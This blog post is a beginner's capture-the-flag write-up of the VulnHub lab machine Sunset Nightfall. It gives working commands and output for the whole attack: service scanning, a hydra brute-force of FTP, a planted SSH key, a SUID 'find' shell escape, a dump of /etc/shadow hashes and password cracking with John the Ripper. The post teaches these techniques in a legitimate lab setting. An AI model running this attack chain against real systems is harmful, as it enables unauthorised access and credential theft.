@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>VulnHub: Sunset Nightfall - ben-dale.co.uk</title><meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<meta property="og:title" content="VulnHub: Sunset Nightfall" />
+<meta property="og:description" content="Here&rsquo;s my writeup for Nightfall, a VulnHub box created by whitecr0wz, which is part of the Sunset series.
+Writeup The description for this box states the following:
+Nightfall is a born2root VM designed for beginners. Virtualbox is strongly recommended for doing this challenge. There wasn&rsquo;t much to go off there so I ran a port scan using nmap to see what was running:
+kali@kali:~/Documents/vulnhub/nightfall/nmap$ nmap -sV -sC -oA nmap 10.0.2.19 Starting Nmap 7." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/vulnhub-sunset-nightfall/" />
+<meta property="article:published_time" content="2020-02-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-02-16T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="VulnHub: Sunset Nightfall"/>
+<meta name="twitter:description" content="Here&rsquo;s my writeup for Nightfall, a VulnHub box created by whitecr0wz, which is part of the Sunset series.
+Writeup The description for this box states the following:
+Nightfall is a born2root VM designed for beginners. Virtualbox is strongly recommended for doing this challenge. There wasn&rsquo;t much to go off there so I ran a port scan using nmap to see what was running:
+kali@kali:~/Documents/vulnhub/nightfall/nmap$ nmap -sV -sC -oA nmap 10.0.2.19 Starting Nmap 7."/>
+<link rel="stylesheet" type="text/css" media="screen" href="/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/main.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/all.css" />
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="/">
+				<img src="/static/img/logo.png" alt="ben-dale.co.uk" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="/">ben-dale.co.uk</a></h1>
+	<div class="site-description"><p>some guy that does some stuff</p><nav class="nav social">
+			<ul class="flat"><li class="li-social"><a href="https://github.com/ben-dale"><i title="Github" class="icons fab fa-github"></i></a></li><li class="li-social"><a href="https://twitter.com/mrbenjamind"><i title="Twitter" class="icons fab fa-twitter"></i></a></li><li class="li-social"><a href="https://keybase.io/mrbenjamind"><i title="Keybase" class="icons fab fa-keybase"></i></a></li></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="author">
+				
+			</div>
+			<div class="post-header">
+				
+					<div class="meta">
+						<div class="date">
+							<span class="day">16</span>
+							<span class="rest">Feb 2020</span>
+						</div>
+					</div>
+				
+				<div class="matter">
+					<h1 class="title">VulnHub: Sunset Nightfall</h1>
+				</div>
+			</div>
+			<div class="markdown">
+				<p>Here&rsquo;s my writeup for <a href="https://www.vulnhub.com/entry/sunset-nightfall,355/">Nightfall</a>, a VulnHub box created by whitecr0wz, which is part of the <a href="https://www.vulnhub.com/series/sunset,225/">Sunset</a> series.</p>
+<h3 id="writeup">Writeup</h3>
+<p>The description for this box states the following:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Nightfall is a born2root VM designed for beginners. Virtualbox is strongly recommended for doing this challenge.
+</code></pre></div><p>There wasn&rsquo;t much to go off there so I ran a port scan using nmap to see what was running:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/nightfall/nmap$ nmap -sV -sC -oA nmap 10.0.2.19
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-09 13:48 EST
+Nmap scan report for 10.0.2.19
+Host is up (0.00016s latency).
+Not shown: 994 closed ports                                                                                                                                                                                                               
+PORT     STATE SERVICE     VERSION                                                                                                                                                                                                        
+21/tcp   open  ftp         pyftpdlib 1.5.5                                                                                                                                                                                                
+| ftp-syst:                                                                                                                                                                                                                               
+|   STAT:                                                                                                                                                                                                                                 
+| FTP server status:                                                                                                                                                                                                                      
+|  Connected to: 10.0.2.19:21                                                                                                                                                                                                             
+|  Waiting for username.                                                                                                                                                                                                                  
+|  TYPE: ASCII; STRUcture: File; MODE: Stream                                                                                                                                                                                             
+|  Data connection closed.                                                                                                                                                                                                                
+|_End of status.                                                                                                                                                                                                                          
+22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10 (protocol 2.0)                                                                                                                                                                         
+| ssh-hostkey:                                                                                                                                                                                                                            
+|   2048 a9:25:e1:4f:41:c6:0f:be:31:21:7b:27:e3:af:49:a9 (RSA)                                                                                                                                                                            
+|   256 38:15:c9:72:9b:e0:24:68:7b:24:4b:ae:40:46:43:16 (ECDSA)                                                                                                                                                                           
+|_  256 9b:50:3b:2c:48:93:e1:a6:9d:b4:99:ec:60:fb:b6:46 (ED25519)                                                                                                                                                                         
+80/tcp   open  http        Apache httpd 2.4.38 ((Debian))                                                                                                                                                                                 
+|_http-server-header: Apache/2.4.38 (Debian)                                                                                                                                                                                              
+|_http-title: Apache2 Debian Default Page: It works                                                                                                                                                                                       
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                                                                                                    
+445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)                                                                                                                                                                 
+3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1                                                                                                                                                                                  
+| mysql-info:                                                                                                                                                                                                                             
+|   Protocol: 10                                                                                                                                                                                                                          
+|   Version: 5.5.5-10.3.15-MariaDB-1                                                                                                                                                                                                      
+|   Thread ID: 15                                                                                                                                                                                                                         
+|   Capabilities flags: 63486                                                                                                                                                                                                             
+|   Some Capabilities: Support41Auth, ConnectWithDatabase, DontAllowDatabaseTableColumn, FoundRows, SupportsCompression, SupportsLoadDataLocal, ODBCClient, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, InteractiveClient, LongColumnFlag, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments                                                                                                
+|   Status: Autocommit                                                                                                                                                                                                                    
+|   Salt: \n5]Rd~n/&lt;}%:5=qA3v|                                                                                                                                                                                                            
+|_  Auth Plugin Name: mysql_native_password                                                                                                                                                                                               
+Service Info: Host: NIGHTFALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                                  
+                                                                                                                                                                                                                                          
+Host script 
+results:
+...
+...                                   
+</code></pre></div><p>That&rsquo;s a lot of services! FTP, SSH, Apache HTTP Server, something called &ldquo;Samba&rdquo; (I&rsquo;d not heard of this service before now) and MySQL. I started with port 80, opening up Firefox to see if anything interesting was running.</p>
+<p><img src="/static/sunrise-nightfall/1.png" alt=""></p>
+<p>It looks like it&rsquo;s a default Apache HTTP Server install. I ran <code>dirb</code> against 10.0.2.19 (the IP for Nightfall) with the default word list to make sure there weren&rsquo;t any interesting endpoints hiding but this didn&rsquo;t return anything useful:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/nightfall/nmap$ dirb http://10.0.2.19
+                                                                                                                                                                                                                                          
+-----------------                                                                                                                                                                                                                         
+DIRB v2.22                                                                                                                                                                                                                                
+By The Dark Raver                                                                                                                                                                                                                         
+-----------------                                                                                                                                                                                                                         
+                                                                                                                                                                                                                                          
+START_TIME: Mon Feb 09 13:51:20 2020                                                                                                                                                                                              
+URL_BASE: http://10.0.2.19/                                                                                                                                                                                                               
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt                                                                                                                                                                                      
+                                                                                                                                                                                                                                          
+-----------------                                                                                                                                                                                                                         
+                                                                                                                                                                                                                                          
+GENERATED WORDS: 4612                                                                                                                                                                                                                     
+                                                                                                                                                                                                                                          
+---- Scanning URL: http://10.0.2.19/ ----                                                                                                                                                                                                 
++ http://10.0.2.19/index.html (CODE:200|SIZE:10701)                                                                                                                                                                                       
++ http://10.0.2.19/server-status (CODE:403|SIZE:297)                                                                                                                                                                                      
+                                                                                                                                                                                                                                          
+-----------------                                                                                                                                                                                                                         
+END_TIME: Mon Feb 09 13:51:25 2020
+DOWNLOADED: 4612 - FOUND: 2
+</code></pre></div><p>Next, I took a look at the FTP server. I tried to log in as an anonymous user but no luck:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/nightfall$ ftp 10.0.2.19
+Connected to 10.0.2.19.
+220 pyftpdlib 1.5.5 ready.
+Name (10.0.2.19:kali): anonymous
+331 Username ok, send password.
+Password:
+530 Anonymous access not allowed.
+Login failed.
+</code></pre></div><p>What was curious was that the FTP server wasn&rsquo;t vsftpd (what I&rsquo;ve usually seen in the past), it was something called &ldquo;pyftpdlib&rdquo;. I looked into pyftpdlib and found the GitHub repo which states: &ldquo;Python FTP Server library is a FTP server library providing a portable interface to easily write very efficient asynchronous FTP servers with Python.&rdquo;</p>
+<p>I took a look at the releases, as nmap was reporting the version of pyftpdlib to be 1.5:</p>
+<p><img src="/static/sunrise-nightfall/2.png" alt=""></p>
+<p>It&rsquo;s a few versions out of date so I checked in the GitHub issues and on Exploit DB to see if any exploits had been raised against pyftpdlib but nothing came up.</p>
+<p>To be honest, that&rsquo;s where the story ends for a few days. I was a little overwhelmed by the number of services (still being fairly new to the CTF scene) that could be enumerated and I found myself constantly flipping between services trying to find a way in without a steady aim or trajectory. I took some time away from Nightfall for a bit and given I knew the least about Samba and SMB, that&rsquo;s where I started my research. <a href="https://www.samba.org/samba/what_is_samba.html">The Samba website</a> states: &ldquo;Samba is the standard Windows interoperability suite of programs for Linux and Unix. Since 1992, Samba has provided secure, stable and fast file and print services for all clients using the SMB/CIFS protocol, such as all versions of DOS and Windows, OS/2, Linux and many others.&rdquo;</p>
+<p><a href="https://techterms.com/definition/smb">This particular definition of SMB</a> made the most sense to me: &ldquo;SMB is a network protocol used by Windows-based computers that allows systems within the same network to share files. It allows computers connected to the same network or domain to access files from other local computers as easily as if they were on the computer&rsquo;s local hard drive. Not only does SMB allow computers to share files, but it also enables computers to share printers and even serial ports from other computers within the network. For example, a computer connected to a Windows network could print a document on a printer connected to another computer on the network, as long as both machines support the SMB protocol.&rdquo;</p>
+<p>After reading a few more articles and skimming several RFCs I had a basic understanding of what Samba and SMB were. Now I wanted to know how to start interacting with a Samba server. As predicted <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">IppSec</a> has a <a href="https://www.youtube.com/watch?v=jUc1J31DNdw">great walkthrough</a> of HackTheBox: Active in which they demonstrate how to use different tools to interrogate Samba/SMB.</p>
+<p>Running <a href="https://tools.kali.org/information-gathering/smbmap">SMBMap</a> didn&rsquo;t return anything interesting:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~$ smbmap -H 10.0.2.19
+[+] Finding open SMB ports....
+[+] User SMB session established on 10.0.2.19...
+[+] IP: 10.0.2.19:445   Name: 10.0.2.19                                         
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian
+</code></pre></div><p>Running <a href="https://tools.kali.org/information-gathering/enum4linux">enum4linux</a> however, did return something interesting. This tool outputs a lot of information so I&rsquo;ve stripped out the noise leaving just the interesting lines:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/nightfall$ enum4linux -a 10.0.2.19
+...
+...
+[+] Enumerating users using SID S-1-22-1 and logon username &#39;&#39;, password &#39;&#39;
+S-1-22-1-1000 Unix User\nightfall (Local User)
+S-1-22-1-1001 Unix User\matt (Local User)
+...
+...
+</code></pre></div><p>I was interested in how enum4linux found these users so that I might understand a bit more on how Samba and SMB work, but within minutes I was down a rabbit hole, reading about the difference between RIDs and a SIDs in Active Directory and RID cycling attacks using null sessions. Given that I had a username to start enumerating the other services with and my knowledge of Windows is minimal, I didn&rsquo;t fancy losing my mind with the exact details at this point so I left the <em>fascinating</em> world of Samba/Windows/Active Directory/SID/RID for now, with a todo on my list to spend more time understanding this technology soon.</p>
+<p>I tried to FTP in as <code>matt</code> and I was prompted for a password. I recalled seeing an <code>ftp</code> mode for hydra so I looked into it, found the argument and gave it a go:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/nightfall$ hydra -l matt -P /usr/share/wordlists/rockyou.txt -vV 10.0.2.19 ftp -f
+...
+[ATTEMPT] target 10.0.2.19 - login &#34;matt&#34; - pass &#34;123456&#34; - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.0.2.19 - login &#34;matt&#34; - pass &#34;12345&#34; - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.0.2.19 - login &#34;matt&#34; - pass &#34;123456789&#34; - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.0.2.19 - login &#34;matt&#34; - pass &#34;password&#34; - 4 of 14344399 [child 3] (0/0)
+...
+</code></pre></div><p>After around 30 seconds a password was found:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">...
+[ATTEMPT] target 10.0.2.19 - login &#34;matt&#34; - pass &#34;cheese&#34; - 154 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.0.2.19 - login &#34;matt&#34; - pass &#34;159753&#34; - 155 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.0.2.19 - login &#34;matt&#34; - pass &#34;arsenal&#34; - 156 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.0.2.19 - login &#34;matt&#34; - pass &#34;dolphin&#34; - 157 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.0.2.19 - login &#34;matt&#34; - pass &#34;antonio&#34; - 158 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.0.2.19 - login &#34;matt&#34; - pass &#34;heather&#34; - 159 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.0.2.19 - login &#34;matt&#34; - pass &#34;david&#34; - 160 of 14344399 [child 15] (0/0)
+[21][ftp] host: 10.0.2.19   login: matt   password: cheese
+[STATUS] attack finished for 10.0.2.19 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-15 10:36:46
+</code></pre></div><p>I logged into the FTP server as <code>matt</code>, using the password <code>cheese</code>, and started looking around:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/nightfall$ ftp 10.0.2.19
+Connected to 10.0.2.19.
+220 pyftpdlib 1.5.5 ready.
+Name (10.0.2.19:kali): matt
+331 Username ok, send password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 Active data connection established.
+125 Data connection already open. Transfer starting.
+-rw-------   1 matt     matt            0 Aug 28 22:41 .bash_history
+-rw-r--r--   1 matt     matt          220 Aug 26 00:34 .bash_logout
+-rw-r--r--   1 matt     matt         3526 Aug 26 00:34 .bashrc
+drwx------   3 matt     matt         4096 Aug 28 21:26 .gnupg
+drwxr-xr-x   3 matt     matt         4096 Aug 26 00:42 .local
+-rw-r--r--   1 matt     matt          807 Aug 26 00:34 .profile
+-rw-------   1 matt     matt            0 Aug 28 22:41 .sh_history
+226 Transfer complete.
+ftp&gt; 
+</code></pre></div><p>The first thing I noticed was the <code>.gnupg</code> directory but unfortunately I didn&rsquo;t find anything exciting in it. Changing directories outside of <code>matt</code>'s home directory wasn&rsquo;t permitted. I was stuck in the home directory <em>but</em> I had read/write permissions. I also knew the box had SSH access so the plan was to exploit that.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/nightfall$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/Documents/vulnhub/nightfall/ssh
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/kali/Documents/vulnhub/nightfall/ssh.
+Your public key has been saved in /home/kali/Documents/vulnhub/nightfall/ssh.pub.
+kali@kali:~/Documents/vulnhub/nightfall$ cp ssh.pub authorized_keys
+</code></pre></div><p>I created a passwordless keypair on my machine. Once I had the authorized_keys file created (which was just a copy of the ssh public key) I created a <code>.ssh</code> directory in <code>matt</code>'s home directory and uploaded the authorized_keys file:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ftp&gt; mkdir .ssh
+257 &#34;/.ssh&#34; directory created. 
+ftp&gt; cd .ssh
+250 &#34;/.ssh&#34; is the current directory.
+ftp&gt; put authorized_keys
+local: authorized_keys remote: authorized_keys
+200 Active data connection established.
+125 Data connection already open. Transfer starting.
+226 Transfer complete.
+563 bytes sent in 0.00 secs (204.6927 kB/s)
+</code></pre></div><p>I opened up a new terminal and ssh&rsquo;d in as <code>matt</code>, using the private key as the identity file:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/nightfall$ ssh matt@10.0.2.19 -i ssh
+Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+...
+...
+matt@nightfall:~$ 
+</code></pre></div><p>Once I was logged in as <code>matt</code> I downloaded a copy of <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum.sh</a> from my machine (10.0.2.15) and ran it as <code>matt</code>:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">matt@nightfall:~$ wget http://10.0.2.15:8000/LinEnum.sh
+...
+...
+2020-02-15 10:49:45 (23.4 MB/s) - ‘LinEnum.sh’ saved [46631/46631]
+</code></pre></div><p>Again, like <code>enum4linux</code>, LinEnum outputs a lot of information, but the interesting bit in all of the noise was here:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">matt@nightfall:~$ ./LinEnum.sh
+...
+...
+[+] Possibly interesting SUID files:
+-rwsr-sr-x 1 nightfall nightfall 315904 Aug 28 14:31 /scripts/find
+...
+...
+</code></pre></div><p>This copy of <code>find</code> runs as user <code>nightfall</code> due to the SUID permission on the file. <code>find</code> can execute shell commands (using the <code>-exec</code> flag) and <a href="https://gtfobins.github.io/gtfobins/find/">GTFOBins</a> documents a nice one-liner to get a shell via find.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">matt@nightfall:~$ cd /scripts
+matt@nightfall:/scripts$ ./find . -exec /bin/sh -p \; -quit
+$ whoami
+nightfall
+$ cd /home/nightfall
+$ ls
+user.txt
+$ cat user.txt
+97fb7140ca325ed96f67be3c9e30083d
+</code></pre></div><p>The first flag was found. To get around having to pivot through <code>matt</code> to user <code>nightfall</code> (and to also get a better shell) I decided to set up ssh the same way I did for <code>matt</code>:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ mkdir .ssh
+$ cd .ssh
+$ cp /home/matt/.ssh/authorized_keys authorized_keys
+</code></pre></div><p>Once the authorized_keys were in place I could ssh in as <code>nightfall</code>.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/nightfall$ ssh nightfall@10.0.2.19 -i ssh
+Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+...
+...
+nightfall@nightfall:~$ 
+</code></pre></div><p>Running LinEnum again (this time as <code>nightfall</code>) flagged something interesting:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">nightfall@nightfall:~$ /home/matt/./LinEnum.sh
+...
+(root) NOPASSWD: /usr/bin/cat
+...
+</code></pre></div><p>&ldquo;Wait, does this mean I can run <code>sudo cat</code> as <code>root</code> without a password?&rdquo; I thought. Yes:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">nightfall@nightfall:~$ sudo cat /etc/shadow
+root:$6$JNHsN5GY.jc9CiTg$MjYL9NyNc4GcYS2zNO6PzQNHY2BE/YODBUuqsrpIlpS9LK3xQ6coZs6lonzURBJUDjCRegMHSF5JwCMG1az8k.:18134:0:99999:7:::
+daemon:*:18126:0:99999:7:::
+bin:*:18126:0:99999:7:::
+sys:*:18126:0:99999:7:::
+sync:*:18126:0:99999:7:::
+games:*:18126:0:99999:7:::
+man:*:18126:0:99999:7:::
+lp:*:18126:0:99999:7:::
+mail:*:18126:0:99999:7:::
+news:*:18126:0:99999:7:::
+uucp:*:18126:0:99999:7:::
+proxy:*:18126:0:99999:7:::
+www-data:*:18126:0:99999:7:::
+backup:*:18126:0:99999:7:::
+list:*:18126:0:99999:7:::
+irc:*:18126:0:99999:7:::
+gnats:*:18126:0:99999:7:::
+nobody:*:18126:0:99999:7:::
+_apt:*:18126:0:99999:7:::
+systemd-timesync:*:18126:0:99999:7:::
+systemd-network:*:18126:0:99999:7:::
+systemd-resolve:*:18126:0:99999:7:::
+messagebus:*:18126:0:99999:7:::
+avahi-autoipd:*:18126:0:99999:7:::
+avahi:*:18126:0:99999:7:::
+saned:*:18126:0:99999:7:::
+colord:*:18126:0:99999:7:::
+hplip:*:18126:0:99999:7:::
+nightfall:$6$u9n0NMGDN2h3/Npy$y/PVdaqMcdobHf4ZPvbrHNFMwMkPWwamWuKGxn2wqJygEC09UNJNb10X0HBK15Hs4ZwyFtdwixyyfu2QEC1U4/:18134:0:99999:7:::
+systemd-coredump:!!:18126::::::
+sshd:*:18126:0:99999:7:::
+mysql:!:18126:0:99999:7:::
+matt:$6$2u38Z1fOk8zIC5kO$oSfp/Ic0Uhb9225EdHB63ugob.B58mPuJJ8YpMB9hNaZAoJk9n3rhs9DHobzmsB20E5Yxjqsnn1x.QGKeAmiR1:18134:0:99999:7:::
+</code></pre></div><p>I copied the entry in /etc/shadow for the <code>root</code> user into a text file (<code>root_shadow.txt</code>) and used john the ripper to crack the password:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/nightfall$ sudo john root_shadow.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+miguel2          (root)
+1g 0:00:00:09 DONE 2/3 (2020-02-15 11:53) 0.1091g/s 3564p/s 3564c/s 3564C/s miguel2..jesucristo2
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed
+kali@kali:~/Documents/vulnhub/nightfall$ 
+</code></pre></div><p>The final step was to switch to the <code>root</code> user, using the cracked password <code>miguel2</code>:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">nightfall@nightfall:~$ su -
+Password: 
+root@nightfall:~# ls
+root_super_secret_flag.txt
+root@nightfall:~# cat root_super_secret_flag.txt 
+Congratulations! Please contact me via twitter and give me some feedback! @whitecr0w1
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Thank you for playing! - Felipe Winsnes (whitecr0wz)                                 flag{9a5b21fc6719fe33004d66b703d70a39}
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+root@nightfall:~# 
+</code></pre></div><h3 id="final-thoughts">Final thoughts</h3>
+<p>This was the first time I&rsquo;d come face to face with Samba and SMB. I have a lot to learn about Windows (ugh) and some of the common services found running on Windows (ugh) but I&rsquo;m happy the gaps in my knowledge didn&rsquo;t stop me from completing this box. Nightfall was an interesting challenge that forced me to step away for a few days, do my research, and come back with a plan.</p>
+
+			</div>
+			<div class="tags">
+				
+				
+				
+				
+					
+				
+					
+				
+				
+			</div></div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div class="footertext"></div>
+	</nav>
+</div>
+
+
+
+</body>
+</html>
